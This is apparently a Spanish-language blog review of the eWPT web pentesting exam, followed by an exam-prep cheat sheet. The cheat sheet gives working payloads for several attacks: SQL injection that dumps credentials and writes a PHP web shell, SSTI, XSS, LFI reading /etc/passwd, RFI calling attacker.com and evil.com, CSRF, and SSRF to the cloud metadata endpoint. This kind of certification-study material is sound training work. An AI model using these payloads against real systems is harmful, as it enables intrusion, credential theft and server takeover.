## ¿Cómo es el examen?

El eWPT es un examen práctico compuesto por 50 preguntas tipo test que deben resolverse en un plazo de 10 horas. Se desarrolla en un laboratorio que incluye entre 3 y 5 hosts, donde cada uno puede exponer múltiples servicios HTTP en distintos puertos. Además, es común encontrar diferentes tecnologías ejecutándose en cada uno de estos servicios, lo que requiere identificar y explotar diversas superficies de ataque dentro del entorno.

## Motivo de sacarme el examen

Decidí rendir el eWPT aproximadamente un mes después de obtener el eJPT, periodo en el que reforcé mis conocimientos en vulnerabilidades web. La principal razón fue validar de forma objetiva mi nivel en hacking web, ya que es el área en la que más he trabajado y profundizado. Más que buscar solo la certificación, quería medir mis habilidades y confirmar si mi base técnica y metodología eran suficientes, utilizando el examen como una referencia clara de mi progreso en este campo.

## Experiencia durante el examen y gestión del tiempo

Durante el examen utilicé prácticamente las 10 horas completas, ya que al inicio me encontré con un escenario que parecía un **rabbit hole**: una parte sin aparente solución, pero que estaba relacionada con una pregunta que requería haber comprometido el sitio. Esto me hizo perder gran parte del tiempo probando distintas opciones sin éxito hasta que finalmente logré resolverlo. Por eso, es importante gestionar bien el tiempo, ya que aunque 10 horas parecen suficientes, es fácil quedarse estancado sin darse cuenta.

Al terminar todas las preguntas me quedaban unos 5 minutos, por lo que decidí revisarlas pensando que el examen se enviaría automáticamente al acabarse el tiempo. Fue un error: si no envías las respuestas manualmente dentro del plazo, el sistema te califica como desaprobado. Afortunadamente, el examen incluye dos intentos, así que 30 minutos después lo volví a rendir y esta vez lo aprobé.

## Impresiones del examen

El examen está muy enfocado en la enumeración y el discovery: se presentan varias IPs con subdominios donde debes identificar múltiples aplicaciones web y analizarlas en profundidad. Prácticamente cada aplicación que descubres tiene al menos una vulnerabilidad, por lo que el reto está en encontrarlas todas sin dejar nada sin revisar. A nivel técnico, se centra en hacking web básico, con vulnerabilidades como XSS, SQLi, Broken Access Control y ataques de fuerza bruta, entre otras.

En muchos casos no es necesario escalar privilegios, por lo que es importante analizar bien las preguntas para entender hasta qué punto te piden llegar. Las vulnerabilidades son bastante básicas y sin demasiada complejidad; si ya entiendes el concepto o lo has practicado al menos una vez, sabrás cómo abordarlas.

Respecto al entorno de trabajo, el laboratorio deja mucho que desear: la máquina proporcionada es limitada, sin acceso a internet y con problemas como un portapapeles poco funcional, lo que dificulta trabajar con la misma comodidad que en un entorno propio.

También presenta un problema similar al eJPT: hay preguntas que prácticamente te indican a qué es vulnerable la máquina, lo que le quita realismo. Además, aunque en menor medida, se abusa del concepto de fuerza bruta, algo que considero poco realista en escenarios reales. En su lugar, hubiera sido más interesante incluir una mayor variedad de vulnerabilidades web o conceptos más actuales.

# Cheat Sheet

## I. Inyecciones

### SQL Injection (SQLi)


- 🔍 1. Descubrir el número de columnas
```sql
' order by 3-- -
```

- ➕ 2. Probar `UNION SELECT`
```sql
' union select 1,2,4-- -
```
> Verifica si `UNION` funciona para combinar resultados con otra consulta, según el numero de columnas.

- 💤 3. Detección de vulnerabilidad (time-based)
```sql
' and sleep(5)-- -
```
> Si la respuesta se **retrasa 5 segundos**, indica que la consulta fue ejecutada: es vulnerable a **SQLi**.

- 🧬 4. Mostrar la base de datos en uso 
```sql
' union select database()-- -
```
> Muestra el nombre de la base de datos activa.

- 🗃️ 5. Listar todas las bases de datos
```sql
' union select group_concat(schema_name) from information_schema.schemata-- -
```
> Devuelve todos los nombres de bases de datos disponibles en el servidor.

- 📑 6. Mostrar tablas de una base de datos
```sql
id=123123' union select group_concat(table_name)
from information_schema.tables
where table_schema='users_db'-- -
```
> Enumera las tablas dentro de la base de datos `users_db`.

- 🧱 7. Mostrar columnas de una tablas
```sql
id=7372' union select group_concat(column_name)
from information_schema.columns
where table_schema='users_db'
and table_name='users'-- -
```
> Devuelve todas las columnas de la tabla `users` en `users_db`.

- 📥 8. Extraer datos de una tabla 
```sql
' union select group_concat(username,0x3a,password) from users_db.users-- -
```
> Lista los valores almacenados en la columna `username`, 0x3a es : en hexadecimal.

- ⚠️ 9. Para agregar un archivo con contenido en una ruta especifica
```sql
' union select "<?php system($_GET['command']); ?>" into outfile "/var/www/html/prueba.php"-- -
```

### Server-Side Template Injection (SSTI)

**Server-Side Template Injection** es una vulnerabilidad que permite a un atacante **inyectar código malicioso** en el motor de plantillas del servidor.
```python
{ { 7*7 } }
```

> Si la salida muestra `49`, significa que el código fue interpretado por el motor de plantillas → **vulnerabilidad SSTI confirmada**.

- 🔍 **Detección de tecnologías**

Antes de explotar SSTI, el atacante puede:

1. Usar herramientas como **WhatWeb**, **Wappalyzer** o **nmap** para identificar frameworks:
    - `Flask` → usa `Jinja2` (vulnerable si mal configurado).
    - `Django`, `Rails`, etc. también pueden serlo si no se filtra correctamente la entrada.
2. Confirmar que se trata de un motor vulnerable enviando payloads de prueba como:
```python
{ {7*7} }, { {1337*42} }, { {config} }, { {''.__class__.__mro__[1].__subclasses__()} }
```

## II. Cross-Site Scripting (XSS)

```html
<!-- Detectar XSS básico -->
<script>alert(1)</script>

<!-- Reflejado (en parámetros URL) -->
?search=<script>alert(1)</script>

<!-- Evadir filtros simples -->
<svg/onload=alert(1)>
"><img src=x onerror=alert(1)>

<!-- DOM-based más claro -->
<script>
  // La web toma lo que está en la URL (#) y lo inserta en el HTML
  document.getElementById("output").innerHTML = location.hash;
</script>

<!-- URL maliciosa -->
#<img src=x onerror=alert(1)>

<!-- Resultado: se ejecuta el alert porque el contenido del hash se inserta sin filtrar -->
```

## V. Inclusión de archivos

```python
# Path Traversal (acceder a archivos fuera del directorio)
GET /download?file=../../../../etc/passwd
GET /image?name=../../../windows/win.ini

# LFI (incluir archivos locales)
GET /index.php?page=../../../../etc/passwd
GET /index.php?page=php://filter/convert.base64-encode/resource=index.php

# RFI (incluir archivos remotos)
GET /index.php?page=http://attacker.com/shell.txt
GET /index.php?page=https://evil.com/malicious.php

# File Upload (subir archivos maliciosos)
Subir: shell.php  → ejecutar código en el servidor
Subir: image.php.jpg → evadir validaciones y ejecutar
```

## VI. Request Forgery

```python
# CSRF (forzar acciones en nombre del usuario)
<form action="https://victima.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@mail.com">
</form>

<!-- CSRF (GET) -->
<img src="https://victima.com/deleteAccount?id=1">

# SSRF (el servidor hace requests internos)
GET /fetch?url=http://127.0.0.1:80
GET /api?url=http://169.254.169.254/latest/meta-data
```
